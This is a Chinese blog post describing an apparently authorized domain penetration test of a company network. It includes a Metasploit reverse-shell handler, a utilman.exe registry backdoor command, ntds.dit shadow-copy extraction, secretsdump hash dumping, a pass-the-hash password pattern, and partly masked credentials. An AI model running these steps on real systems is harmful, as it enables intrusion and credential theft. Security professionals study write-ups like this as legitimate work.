@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 前言前段参与了一个项目,在项目中,实行的范围在一个会议室，目的是检测内网安全,并需要拿到该公司的财务报表，此文将全部脱敏，涉及某厂商，中间会穿插一些小的知识点与细节。 0x01 信息收集一开始，通过沟通，拿到了内网所在的IP段及所对应的部门信息，由于内部wifi认证缺陷，导致dhcp分配给我了个白名单ip,并且绑定了我的MAC，使得我不使用入网账号直接连入办公网。  为了能尽快找到突破口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次域渗透测试">
+<meta property="og:url" content="http://yoursite.com/2019/03/16/----1/index.html">
+<meta property="og:site_name" content="c1y2m3’blog">
+<meta property="og:description" content="0x00 前言前段参与了一个项目,在项目中,实行的范围在一个会议室，目的是检测内网安全,并需要拿到该公司的财务报表，此文将全部脱敏，涉及某厂商，中间会穿插一些小的知识点与细节。 0x01 信息收集一开始，通过沟通，拿到了内网所在的IP段及所对应的部门信息，由于内部wifi认证缺陷，导致dhcp分配给我了个白名单ip,并且绑定了我的MAC，使得我不使用入网账号直接连入办公网。  为了能尽快找到突破口">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460">
+<meta property="og:updated_time" content="2019-03-16T09:49:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次域渗透测试">
+<meta name="twitter:description" content="0x00 前言前段参与了一个项目,在项目中,实行的范围在一个会议室，目的是检测内网安全,并需要拿到该公司的财务报表，此文将全部脱敏，涉及某厂商，中间会穿插一些小的知识点与细节。 0x01 信息收集一开始，通过沟通，拿到了内网所在的IP段及所对应的部门信息，由于内部wifi认证缺陷，导致dhcp分配给我了个白名单ip,并且绑定了我的MAC，使得我不使用入网账号直接连入办公网。  为了能尽快找到突破口">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>记一次域渗透测试</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2019/02/06/两种使用python实现SSRF检测/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/16/----1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/16/----1/&text=记一次域渗透测试"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/16/----1/&is_video=false&description=记一次域渗透测试"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次域渗透测试&body=Check out this article: http://yoursite.com/2019/03/16/----1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/16/----1/&name=记一次域渗透测试&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-信息收集"><span class="toc-number">2.</span> <span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-后渗透的开始"><span class="toc-number">3.</span> <span class="toc-text">0x01 后渗透的开始</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-再一次克服困难"><span class="toc-number">4.</span> <span class="toc-text">0x02 再一次克服困难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-横向移动"><span class="toc-number">5.</span> <span class="toc-text">0x03 横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-总结"><span class="toc-number">6.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        记一次域渗透测试
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">c1y2m3’blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-03-16T09:50:00.000Z" itemprop="datePublished">2019-03-16</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段参与了一个项目,在项目中,实行的范围在一个会议室，目的是检测内网安全,并需要拿到该公司的财务报表，此文将全部脱敏，涉及某厂商，中间会穿插一些小的知识点与细节。</p>
+<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>一开始，通过沟通，拿到了内网所在的IP段及所对应的部门信息，由于内部wifi认证缺陷，导致dhcp分配给我了个白名单ip,并且绑定了我的MAC，使得我不使用入网账号直接连入办公网。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722" alt=""></p>
+<p>为了能尽快找到突破口，这里我直接用ms17-010,并得到以下结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.5.46(Windows7 Ultimate7601 ServicePack 1) 财务部\董办</span><br><span class="line">192.168.2.209(Windows Server2008R2 Standard 7600) </span><br><span class="line">192.168.20.75(Windows Server2012 R2) </span><br><span class="line">192.168.6.31(Windows 7 Enterprise  7601) 人力资源部</span><br><span class="line">192.168.7.98 (Windows7 Ultimate7601 ServicePack 1) 运维和安全</span><br><span class="line">192.168.8.81 (Windows7 Ultimate7601 ServicePack 1)  信息技术事业部</span><br><span class="line">192.168.8.124  (Windows7 Ultimate7601 ServicePack 1)</span><br></pre></td></tr></table></figure>
+<p>心想 内网中每个ip段都雨露均沾了，岂不是美滋滋，然而并不是这样,在后面发现由于内网存在趋势防火墙、360套餐，已经把特征流量进行了拦截，这就有点悲剧了， (后续) -&gt;  通过python发送shellcode 成功拿下 一台192.168.2.209 测试段的域控，推测是研发的测试机，故未深入。</p>
+<p>于是放弃了这个突破点，对内网的资产进行了探测，发现了大量研发部的mysql、dubbo、Jenkins、redis等弱口令，通过这些获取到了不少信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.2:6379 is Redis Unauthorized</span><br><span class="line">192.168.20.205:6379 is Redis Unauthorized </span><br><span class="line">192.168.2.252:6379 redis unauthorized   </span><br><span class="line"> 192.168.3.2:6379 redis unauthorized</span><br><span class="line">192.168.20.71:6379 redis unauthorized</span><br><span class="line">192.168.20.67:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.68:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.205:6379 redis unauthorized</span><br></pre></td></tr></table></figure>
+<p>由于安全设置问题，导致写入参数不能使用，只成功写入一台并反弹shell<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97" alt=""><br>后面又利用Supervisord远程代码执行、Jenkins等拿下了几台linux机器，当然，在内网中，这不值得一说，就不一样诉说了。</p>
+<h1 id="0x01-后渗透的开始"><a href="#0x01-后渗透的开始" class="headerlink" title="0x01 后渗透的开始"></a>0x01 后渗透的开始</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.38:3306 mysql username:root,password:123456</span><br><span class="line"> z00382.dcxxx.com  D:\dev_software\mysql-5.6.24-winx64</span><br><span class="line"> </span><br><span class="line">192.168.8.116:3306 mysql username:root,password:123456</span><br><span class="line"> x00552.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.8.123:3306 mysql username:root,password:root </span><br><span class="line">z00529.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.9.31:3306 mysql username:root,password:123456</span><br><span class="line">y00478.dcxxx.com    D:\fix_soft\mysql-5.7.22-winx64\</span><br></pre></td></tr></table></figure>
+<p>发现在域中，信息安全部 / 风险经营事业部 存在弱口令的mysql，在数据库内发现大量邮箱账户以及对应的AES加密后的密码，一波尝试未解开, 故还是使用UDF提权, 首先对其进行了一波系统信息收集。</p>
+<p>参考: <a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">利用MySQL UDF提权</a></p>
+<p>虽然有四个root权限，提权之路并不是那么的顺利，依然被趋势杀毒intercept了，但，视乎是域用户本地策略的缘故，还是成功的拿到了一台域主机的本地system权限。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6" alt=""></p>
+<p>然后利用 powershell，进行反弹个meterpreter,进行后渗透，但查看进程无果，一样被拦的死死的。</p>
+<p>接下来的思路是:</p>
+<p>启用Guest账号 - &gt; 3389远程连接 -&gt; Mimikatz -&gt; Tscon-&gt; 进行横向移动 </p>
+<p>由于本地策略的问题，Guest没有权限进行rdp，后面发现本地存在xxx用户，</p>
+<p>为了加快进度，修改了本地xxx用户密码(不太优雅)，后面顺利的进入了桌面。</p>
+<p>原来进程里还有 360杀毒、趋势杀毒端，为了更好的维持权限，故丢个免杀上去。</p>
+<p>项目地址:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secretsquirrel/the-backdoor-factory</span><br></pre></td></tr></table></figure>
+<p>原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jump到代码段，来触发payload。 </p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16" alt="微信截图_20190316143725.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.111</span><br><span class="line">lhost =&gt; 192.168.1.111</span><br><span class="line">msf exploit(handler) &gt; set lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf exploit(handler) &gt; exploit -j </span><br><span class="line">//开启本地监听</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8" alt=""></p>
+<p>此时的环境不被允许允许Mimikatz、 当然，离线提取lsass.exe 也是可以的，为了能更快的提取到 明文密码， 故没采用此方法。</p>
+<h1 id="0x02-再一次克服困难"><a href="#0x02-再一次克服困难" class="headerlink" title="0x02 再一次克服困难"></a>0x02 再一次克服困难</h1><p>通过注册表劫持实现后门，修改注册表的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<p>由于是system权限，也就很简单的通过tscon进入了域用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcxxx.com/k00529</span><br></pre></td></tr></table></figure>
+<p>此时 已经凌晨十二点了，</p>
+<p>在小伙伴的协助下， 对python进行封装、使用laZagne对目标获取明文密码。</p>
+<p>幸运的是 我们获取到了k00529 这个域用户的所有信息、例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">主域dc:192.168.20.23 / sz1.dcxxx.com</span><br><span class="line">域管理员: 7个 .....</span><br><span class="line">跳板机:192.168.2.37 / 192.168.2.38</span><br><span class="line"></span><br><span class="line">Login: SMY\XXXXXX</span><br><span class="line">Password: XXXXX7900221A#*</span><br><span class="line"></span><br><span class="line">邮箱:mail.xxxx.com</span><br><span class="line">密码:XXXXXX</span><br><span class="line">堡垒机172.18.80.103  //办公网无法访问</span><br><span class="line"></span><br><span class="line">URL: &lt;http://svn.XXXX.com:80&gt; SVN Repo</span><br><span class="line">Login: k00529</span><br><span class="line">Password: XXXtest01 </span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h1><p>通过k00529 域用户进入跳板机，发现未注销的用户token 极其多，完全可通过跳板机的凭证 进入 个人PC 机，由于时间为白天、易被管理员发现，就不得已实现。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839" alt=""></p>
+<p>从dump的数据中，发现这个域用户的密码有个规律 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXtest01  XXX为固定名字 + test01 /test02 /test03</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8" alt=""><br>通过规律、成功pth到近100+ 域用户，同样，幸运的是 其中有两个域管。</p>
+<p>这就意味的 dcxxx.com 这个域已经沦陷。</p>
+<p>接下来 就是获取域控下所有用户的hash</p>
+<p>用VSS卷影副本来获取域控中的ntds.dit 和system.hiv 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\system.hiv</span><br></pre></td></tr></table></figure>
+<p>使用impacket 的 secretsdump.Py  从ntds.dit文件中转存储NTLM hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /root/impacket/examples/secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460" alt=""></p>
+<p>后面自己编写了个脚本，通过域名批量去获取域用户对应的IP，定位在线目标，进行窃取资料。</p>
+<p>当然，这里使用nmap更快,献丑了….</p>
+<p>最终 从财务部门获取到该公司的下年计划，人员组织构架，财务报表，盈利情况，以及内部相关work文档等。</p>
+<p>进行放弃权限，所有操作并未更改，下载，删除等一切损害该公司的行为。</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>1、在行动之前思考几分钟，有没有更好的办法<br>2、思考一个问题多个解决方案的利弊<br>3、选取自己熟悉的协议进行信息搜集<br>4、网络命令一定要熟<br>5、对于后门要加强维护<br>6、渗透的本质是信息搜集，每一次的项目如果碰到迷茫无解的时候，请继续搜集。而信息搜集的本质是渗透的沉思。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-信息收集"><span class="toc-number">2.</span> <span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-后渗透的开始"><span class="toc-number">3.</span> <span class="toc-text">0x01 后渗透的开始</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-再一次克服困难"><span class="toc-number">4.</span> <span class="toc-text">0x02 再一次克服困难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-横向移动"><span class="toc-number">5.</span> <span class="toc-text">0x03 横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-总结"><span class="toc-number">6.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/16/----1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/16/----1/&text=记一次域渗透测试"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/16/----1/&is_video=false&description=记一次域渗透测试"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次域渗透测试&body=Check out this article: http://yoursite.com/2019/03/16/----1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/16/----1/&title=记一次域渗透测试"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/16/----1/&name=记一次域渗透测试&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
